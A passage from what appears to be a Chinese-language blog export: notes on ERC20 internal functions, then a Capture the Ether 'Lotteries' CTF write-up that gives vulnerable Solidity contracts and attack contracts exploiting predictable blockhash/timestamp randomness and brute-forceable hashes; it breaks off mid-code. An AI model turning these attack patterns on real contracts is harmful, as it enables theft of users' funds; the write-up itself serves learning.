class="hljs-title function_">_mint</span>(<span class="hljs-params">address account, uint256 amount</span>) internal virtual &#123;<br>    <span class="hljs-built_in">require</span>(account != <span class="hljs-title function_">address</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&quot;ERC20: mint to the zero address&quot;</span>);<br><br>    <span class="hljs-title function_">_beforeTokenTransfer</span>(<span class="hljs-title function_">address</span>(<span class="hljs-number">0</span>), account, amount);<br><br>    _totalSupply += amount;<br>    unchecked &#123;<br>        <span class="hljs-comment">// Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.</span><br>        _balances[account] += amount;<br>    &#125;<br>    emit <span class="hljs-title class_">Transfer</span>(<span class="hljs-title function_">address</span>(<span class="hljs-number">0</span>), account, amount);<br><br>    <span class="hljs-title function_">_afterTokenTransfer</span>(<span class="hljs-title function_">address</span>(<span class="hljs-number">0</span>), account, amount);<br>&#125;<br><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">_burn</span>(<span class="hljs-params">address account, uint256 amount</span>) internal virtual &#123;<br>    <span class="hljs-built_in">require</span>(account != <span class="hljs-title function_">address</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&quot;ERC20: burn from the zero address&quot;</span>);<br><br>    <span class="hljs-title function_">_beforeTokenTransfer</span>(account, <span class="hljs-title function_">address</span>(<span class="hljs-number">0</span>), amount);<br><br>    uint256 accountBalance = _balances[account];<br>    <span class="hljs-built_in">require</span>(accountBalance &gt;= amount, <span class="hljs-string">&quot;ERC20: burn amount exceeds balance&quot;</span>);<br>    unchecked &#123;<br>        _balances[account] = accountBalance - amount;<br>        <span class="hljs-comment">// Overflow not possible: amount &lt;= accountBalance &lt;= totalSupply.</span><br>        _totalSupply -= amount;<br>    &#125;<br><br>    emit <span class="hljs-title class_">Transfer</span>(account, <span class="hljs-title function_">address</span>(<span class="hljs-number">0</span>), amount);<br><br>    <span class="hljs-title function_">_afterTokenTransfer</span>(account, <span class="hljs-title function_">address</span>(<span class="hljs-number">0</span>), amount);<br>&#125;<br></code></pre></td></tr></table></figure><p>_mint函数:铸币函数，给account地址增加token，增加数量为amount，可发送Transfer事件，其中to为0地址<br>_burn函数:销币函数，燃烧(减少)account地址的token，燃烧数量为amount，可发送Transfer事件，其中to为0地址</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">_approve</span>(<span class="hljs-params"></span><br><span class="hljs-params">    address owner,</span><br><span class="hljs-params">    address spender,</span><br><span class="hljs-params">    uint256 amount</span><br><span class="hljs-params"></span>) internal virtual &#123;<br>    <span class="hljs-built_in">require</span>(owner != <span class="hljs-title function_">address</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&quot;ERC20: approve from the zero address&quot;</span>);<br>    <span class="hljs-built_in">require</span>(spender != <span class="hljs-title function_">address</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&quot;ERC20: approve to the zero address&quot;</span>);<br><br>    _allowances[owner][spender] = amount;<br>    emit <span class="hljs-title class_">Approval</span>(owner, spender, amount);<br>&#125;<br></code></pre></td></tr></table></figure><p>_approve函数：internal函数，要求owner和spender都不是0地址，被approve函数调用，可发送Approval事件。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">_spendAllowance</span>(<span class="hljs-params"></span><br><span class="hljs-params">    address owner,</span><br><span class="hljs-params">    address spender,</span><br><span class="hljs-params">    uint256 amount</span><br><span class="hljs-params"></span>) internal virtual &#123;<br>    uint256 currentAllowance = <span class="hljs-title function_">allowance</span>(owner, spender);<br>    <span class="hljs-keyword">if</span> (currentAllowance != <span class="hljs-title function_">type</span>(uint256).<span class="hljs-property">max</span>) &#123;<br>        <span class="hljs-built_in">require</span>(currentAllowance &gt;= amount, <span class="hljs-string">&quot;ERC20: insufficient allowance&quot;</span>);<br>        unchecked &#123;<br>            <span class="hljs-title function_">_approve</span>(owner, spender, currentAllowance - amount);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>_spendAllowance函数：消耗amount数量的owner授权spender的代币，在currentAllowance等与uint256的最大值的情况下，不更新allowance金额。如果没有足够的余量，则恢复并且报错ERC20: insufficient allowance，可发送Approval事件。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript">    <span class="hljs-keyword">function</span> <span class="hljs-title function_">_beforeTokenTransfer</span>(<span class="hljs-params"></span><br><span class="hljs-params">        address <span class="hljs-keyword">from</span>,</span><br><span class="hljs-params">        address to,</span><br><span class="hljs-params">        uint256 amount</span><br><span class="hljs-params">    </span>) internal virtual &#123;&#125;<br><br>    <br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">_afterTokenTransfer</span>(<span class="hljs-params"></span><br><span class="hljs-params">        address <span class="hljs-keyword">from</span>,</span><br><span class="hljs-params">        address to,</span><br><span class="hljs-params">        uint256 amount</span><br><span class="hljs-params">    </span>) internal virtual &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>_beforeTokenTransfer函数：在任何代币转账前的 Hook，它包括铸币和烧毁。<br>    调用条件：<br>    1.当from和to地址都是0地址时，amount数量的token将要从from地址转账到to地址<br>    2.当from是0地址时，amount数量的token将会被mint给to地址<br>    3.当to是0地址时，from地址amount数量的token将会被销毁掉<br>    4.当from和to地址永远都不是0地址的时候<br>_afterTokenTransfer函数：在任何代币转账后的 Hook，它包括铸币和烧毁。<br>    调用条件：<br>    1.当from和to地址都是0地址时，amount数量的token已经从from地址转账到to地址<br>    2.当from是0地址时，amount数量的token已经被mint给to地址<br>    3.当to是0地址时，from地址amount数量的token已经被销毁掉了<br>    4.当from和to地址永远都不是0地址的时候</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>ERC20 代码中的 _transfer、_mint、_burn、_approve、_spendAllowance、_beforeTokenTransfer、_afterTokenTransfer 都是 internal 函数(其余为 public)，也就是说它们只能被派生合约调用。<br>总的来看，ERC20 其实就是一种最常见的代币标准，它明确了同质化代币的经典功能并规范了开发者编写 token 时的代码，从而方便各种应用适配。</p>]]></content>
    
    
    
    <tags>
      
      <tag>记录ERC20学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lotteries</title>
    <link href="/2022/11/28/Lotteries/"/>
    <url>/2022/11/28/Lotteries/</url>
    
    <content type="html"><![CDATA[<blockquote><h3 id="在以下每个挑战中，我们的目标是在guess时正确猜测答案"><a href="#在以下每个挑战中，我们的目标是在guess时正确猜测答案" class="headerlink" title="在以下每个挑战中，我们的目标是在guess时正确猜测答案"></a>在以下每个挑战中，我们的目标是在guess时正确猜测答案</h3></blockquote><h2 id="第一题：Guess-the-number"><a href="#第一题：Guess-the-number" class="headerlink" title="第一题：Guess the number"></a>第一题：Guess the number</h2><h3 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript">contract <span class="hljs-title class_">GuessTheNumberChallenge</span> &#123;<br>    uint8 answer = <span class="hljs-number">42</span>;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">GuessTheNumberChallenge</span>(<span class="hljs-params"></span>) public payable &#123;<br>        <span class="hljs-built_in">require</span>(msg.<span class="hljs-property">value</span> == <span class="hljs-number">1</span> ether);<br>&#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">isComplete</span>(<span class="hljs-params"></span>) public view returns (bool) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-property">balance</span> == <span class="hljs-number">0</span>;<br>&#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">guess</span>(<span class="hljs-params">uint8 n</span>) public payable &#123;<br>        <span class="hljs-built_in">require</span>(msg.<span class="hljs-property">value</span> == <span class="hljs-number">1</span> ether);<br>        <span class="hljs-keyword">if</span> (n == answer) &#123;<br>            msg.<span class="hljs-property">sender</span>.<span class="hljs-title function_">transfer</span>(<span class="hljs-number">2</span> ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>题目中直接给出了要猜测的数字是 42 ，部署合约输入 42 即可。</p><h2 id="第二题：Guess-the-secret-number"><a href="#第二题：Guess-the-secret-number" class="headerlink" title="第二题：Guess the secret number"></a>第二题：Guess the secret number</h2><h3 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript">contract <span class="hljs-title class_">GuessTheSecretNumberChallenge</span> &#123;<br>    bytes32 answerHash = <span class="hljs-number">0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365</span>;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">GuessTheSecretNumberChallenge</span>(<span class="hljs-params"></span>) public payable &#123;<br>        <span class="hljs-built_in">require</span>(msg.<span class="hljs-property">value</span> == <span class="hljs-number">1</span> ether);<br>&#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">isComplete</span>(<span class="hljs-params"></span>) public view returns (bool) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-property">balance</span> == <span class="hljs-number">0</span>;<br>&#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">guess</span>(<span class="hljs-params">uint8 n</span>) public payable &#123;<br>        <span class="hljs-built_in">require</span>(msg.<span class="hljs-property">value</span> == <span class="hljs-number">1</span> ether);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_">keccak256</span>(n) == answerHash) &#123;<br>            msg.<span class="hljs-property">sender</span>.<span class="hljs-title function_">transfer</span>(<span class="hljs-number">2</span> ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>要求我们给出一个 uint8 类型的数字的 hash 值等于题目给的answerHash，因为uint8最大也不过 255 ，所以我们可以用枚举法写一个 for 循环一个一个来判断。</p><h3 id="攻击代码："><a href="#攻击代码：" class="headerlink" title="攻击代码："></a>攻击代码：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript">contract <span class="hljs-title class_">GuessTheSecretNumberChallenge</span> &#123;<br>    bytes32 answerHash = <span class="hljs-number">0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365</span>;<br>uint8 public answer;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">guess</span>(<span class="hljs-params"></span>) public payable &#123;<br>        <span class="hljs-keyword">for</span>(uint8 i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">255</span>; i++) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_">keccak256</span>(i) == answerHash) &#123;<br>                answer = i;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>部署合约，输入 answer 即可。</p><h2 id="第三题：Guess-the-Random-number"><a href="#第三题：Guess-the-Random-number" class="headerlink" title="第三题：Guess the Random number"></a>第三题：Guess the Random number</h2><h3 id="代码：-2"><a href="#代码：-2" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript">contract <span class="hljs-title class_">GuessTheRandomNumberChallenge</span> &#123;<br>uint8 answer;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">GuessTheRandomNumberChallenge</span>(<span class="hljs-params"></span>) public payable &#123;<br>        <span class="hljs-built_in">require</span>(msg.<span class="hljs-property">value</span> == <span class="hljs-number">1</span> ether);<br>        answer = <span class="hljs-title function_">uint8</span>(<span class="hljs-title function_">keccak256</span>(block.<span class="hljs-title function_">blockhash</span>(block.<span class="hljs-property">number</span> - <span class="hljs-number">1</span>), now));<br>&#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">isComplete</span>(<span class="hljs-params"></span>) public view returns (bool) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-property">balance</span> == <span class="hljs-number">0</span>;<br>&#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">guess</span>(<span class="hljs-params">uint8 n</span>) public payable &#123;<br>        <span class="hljs-built_in">require</span>(msg.<span class="hljs-property">value</span> == <span class="hljs-number">1</span> ether);<br>        <span class="hljs-keyword">if</span> (n == answer) &#123;<br>            msg.<span class="hljs-property">sender</span>.<span class="hljs-title function_">transfer</span>(<span class="hljs-number">2</span> ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这道题answer在我们部署合约时由 block.number 以及 now 生成， block.number 是部署合约时的区块高度，很容易获得， now 是当前的时间戳，这是个比较麻烦的地方，我们可以使用 injected provider 在 remix 中使用的我们的 metamask 钱包部署合约。题目的 1 ether 太高了，我们可以自行降低，这里我用的 0.001 ether 即 1 Finny。</p><p>部署了合约之后，我们可以去区块链浏览器上查看合约的情况，点击 view on etherscan：</p><p>可以看到当前交易的信息：<img src="/2022/11/28/Lotteries/%E5%9B%BE%E7%89%871.png" class=""></p><p>点击 State ，第二个 address 就是我们合约的地址，点击旁边的箭头就可以看见合约中有一个 storage 变量的变化，answer 就是 99：<img src="/2022/11/28/Lotteries/%E5%9B%BE%E7%89%872.png" class=""></p><p>输入答案99即可：<img src="/2022/11/28/Lotteries/%E5%9B%BE%E7%89%873.png" class=""></p><h2 id="第四题：Guess-the-New-number"><a href="#第四题：Guess-the-New-number" class="headerlink" title="第四题：Guess the New number"></a>第四题：Guess the New number</h2><h3 id="代码：-3"><a href="#代码：-3" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript">contract <span class="hljs-title class_">GuessTheNewNumberChallenge</span> &#123;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">GuessTheNewNumberChallenge</span>(<span class="hljs-params"></span>) public payable &#123;<br>        <span class="hljs-built_in">require</span>(msg.<span class="hljs-property">value</span> == <span class="hljs-number">0.001</span> ether);<br>&#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">isComplete</span>(<span class="hljs-params"></span>) public view returns (bool) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-property">balance</span> == <span class="hljs-number">0</span>;<br>&#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">guess</span>(<span class="hljs-params">uint8 n</span>) public payable &#123;<br>        <span class="hljs-built_in">require</span>(msg.<span class="hljs-property">value</span> == <span class="hljs-number">0.001</span> ether);<br>        uint8 answer = <span class="hljs-title function_">uint8</span>(<span class="hljs-title function_">keccak256</span>(block.<span class="hljs-title function_">blockhash</span>(block.<span class="hljs-property">number</span> - <span class="hljs-number">1</span>), now));<br>        <span class="hljs-keyword">if</span> (n == answer) &#123;<br>            msg.<span class="hljs-property">sender</span>.<span class="hljs-title function_">transfer</span>(<span class="hljs-number">0.002</span> ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这道题answer变成了在我们运行guess函数时生成，上一题的方法就不行了，我们可以写一个攻击函数，构造一个answer，然后从攻击函数来调用guess函数。</p><h3 id="攻击函数："><a href="#攻击函数：" class="headerlink" title="攻击函数："></a>攻击函数：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;./GuessTheNewNumber.sol&quot;</span>;<br>contract <span class="hljs-title class_">Poc</span> &#123;<br><span class="hljs-title class_">GuessTheNewNumberChallenge</span> target;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">pwn</span>(<span class="hljs-params"></span>) public payable &#123;<br>        uint8 answer = <span class="hljs-title function_">uint8</span>(<span class="hljs-title function_">keccak256</span>(block.<span class="hljs-title function_">blockhash</span>(block.<span class="hljs-property">number</span> - <span class="hljs-number">1</span>), now));<br>        target.<span class="hljs-property">guess</span>.<span class="hljs-title function_">value</span>(<span class="hljs-number">0.001</span> ether)(answer);<br>&#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">poc</span>(<span class="hljs-params">address _addr</span>) public &#123;<br>        target = <span class="hljs-title class_">GuessTheNewNumberChallenge</span>(_addr);<br>&#125;<br><br>    <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) public payable &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过pwn函数我们生成了一个answer，它和目标合约中的guess函数中的answer是同时生成的，然后调用目标合约的guess函数，传入答案answer，金额是0.001 ether，目的是通过guess函数的require。<br>部署合约，调用pwn函数即可：<img src="/2022/11/28/Lotteries/%E5%9B%BE%E7%89%874.png" class=""> <img src="/2022/11/28/Lotteries/%E5%9B%BE%E7%89%875.png" class=""></p><p>攻击完成</p><h2 id="第五题：Predict-the-future"><a href="#第五题：Predict-the-future" class="headerlink" title="第五题：Predict the future"></a>第五题：Predict the future</h2><h3 id="代码：-4"><a href="#代码：-4" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs javascript">pragma solidity ^<span class="hljs-number">0.4</span><span class="hljs-number">.21</span>;<br>contract <span class="hljs-title class_">PredictTheFutureChallenge</span> &#123;<br>    address guesser;<br>    uint8 guess;<br>uint256 settlementBlockNumber;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">PredictTheFutureChallenge</span>(<span class="hljs-params"></span>) public payable &#123;<br>        <span class="hljs-built_in">require</span>(msg.<span class="hljs-property">value</span> == <span class="hljs-number">0.001</span> ether);<br>&#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">isComplete</span>(<span class="hljs-params"></span>) public view returns (bool) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-property">balance</span> == <span class="hljs-number">0</span>;<br>&#125;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">lockInGuess</span>(<span class="hljs-params">uint8 n</span>) public payable &#123;<br>        <span class="hljs-built_in">require</span>(guesser == <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">require</span>(msg.<span class="hljs-property">value</span> == <span class="hljs-number">1</span> ether);<br>        guesser = msg.<span class="hljs-property">sender</span>;<br>        guess = n;<br>        settlementBlockNumber = block.<span class="hljs-property">number</span> + <span class="hljs-number">1</span>;<br>&#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">settle</span>(<span class="hljs-params"></span>) public &#123;<br>        <span class="hljs-built_in">require</span>(msg.<span class="hljs-property">sender</span> == guesser);<br>        <span class="hljs-built_in">require</span>(block.<span class="hljs-property">number</span> &gt; settlementBlockNumber);<br><br>        uint8 answer = <span class="hljs-title function_">uint8</span>(<span class="hljs-title function_">keccak256</span>(block.<span class="hljs-title function_">blockhash</span>(block.<span class="hljs-property">number</span> - <span class="hljs-number">1</span>), now)) % <span class="hljs-number">10</span>;<br>        guesser = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (guess == answer) &#123;<br>            msg.<span class="hljs-property">sender</span>.<span class="hljs-title function_">transfer</span>(<span class="hljs-number">2</span> ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这道题answer的生成方式和上一题一样，依然是利用block.number和now来生产，但是猜测的范围变成了0 - 10，不同于上题的是它需要我们先通过lockInGuess函数设置一个我们猜测的数字guess，也就是我们猜测的数字是确定的，但是answer变化的，所以我们可以构造一个合约，当我们设置的guess和当前的answer相同的时候再执行settle函数。</p><h3 id="攻击合约："><a href="#攻击合约：" class="headerlink" title="攻击合约："></a>攻击合约：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;./PredictTheFuture.sol&quot;</span>;<br>contract attack &#123;<br>    <span class="hljs-title class_">PredictTheFutureChallenge</span> challenge;<br>uint8 <span class="hljs-title class_">Myguess</span> = <span class="hljs-number">5</span>;<br><br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">address _addr</span>) public &#123;<br>        challenge = <span class="hljs-title class_">PredictTheFutureChallenge</span>(_addr);<br>&#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">gue</span>(<span class="hljs-params"></span>) public payable &#123;<br>        challenge.<span class="hljs-property">lockInGuess</span>.<span class="hljs-title function_">value</span>(msg.<span class="hljs-property">value</span>)(<span class="hljs-title class_">Myguess</span>);<br>&#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">set</span>(<span class="hljs-params"></span>) public &#123;<br>        <span class="hljs-built_in">require</span>(<span class="hljs-title class_">Myguess</span> == <span class="hljs-title function_">uint8</span>(<span class="hljs-title function_">keccak256</span>(block.<span class="hljs-title function_">blockhash</span>(block.<span class="hljs-property">number</span> - <span class="hljs-number">1</span>), now)) % <span class="hljs-number">10</span>,<span class="hljs-string">&quot;fail&quot;</span>);<br>        challenge.<span class="hljs-title function_">settle</span>();<br>&#125;<br><br>    <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) public payable&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>部署合约，先调用gue函数设置一个猜测的guess(我选择的5)，再调用set函数直到成功为止即可(运气成分比较大)</p><h2 id="第六题：Guess-the-Hash-Number"><a href="#第六题：Guess-the-Hash-Number" class="headerlink" title="第六题：Guess the Hash Number"></a>第六题：Guess the Hash Number</h2><h3 id="代码：-5"><a href="#代码：-5" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs javascript">pragma solidity ^<span class="hljs-number">0.4</span><span class="hljs-number">.21</span>;<br>contract <span class="hljs-title class_">PredictTheBlockHashChallenge</span> &#123;<br>    address guesser;<br>    bytes32 guess;<br>uint256 settlementBlockNumber;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">PredictTheBlockHashChallenge</span>(<span class="hljs-params"></span>) public payable &#123;<br>        <span class="hljs-built_in">require</span>(msg.<span class="hljs-property">value</span> == <span class="hljs-number">0.001</span> ether);<br>&#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">isComplete</span>(<span class="hljs-params"></span>) public view returns (bool) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-property">balance</span> == <span class="hljs-number">0</span>;<br>&#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">lockInGuess</span>(<span class="hljs-params">bytes32 hash</span>) public payable &#123;<br>        <span class="hljs-built_in">require</span>(guesser == <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">require</span>(msg.<span class="hljs-property">value</span> == <span class="hljs-number">0.001</span> ether);<br>        guesser = msg.<span class="hljs-property">sender</span>;<br>        guess = hash;<br>        settlementBlockNumber = block.<span class="hljs-property">number</span> + <span class="hljs-number">1</span>;<br>&#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">settle</span>(<span class="hljs-params"></span>) public &#123;<br>        <span class="hljs-built_in">require</span>(msg.<span class="hljs-property">sender</span> == guesser);<br>        <span class="hljs-built_in">require</span>(block.<span class="hljs-property">number</span> &gt; settlementBlockNumber);<br>        bytes32 answer = block.<span class="hljs-title function_">blockhash</span>(settlementBlockNumber);<br>        guesser = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (guess == answer) &#123;<br>            msg.<span class="hljs-property">sender</span>.<span class="hljs-title function_">transfer</span>(<span class="hljs-number">0.002</span> ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>题目要求我们猜测下一个区块的256位的Hash值。<br>“出于可扩展性的原因，区块哈希并非对所有区块都可用。您只能访问最近 256 个区块的哈希值，所有其他值将为零。”<br>所以我们只需要等待256个区块就可以解决这个问题。</p><h3 id="攻击代码：-1"><a href="#攻击代码：-1" class="headerlink" title="攻击代码："></a>攻击代码：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 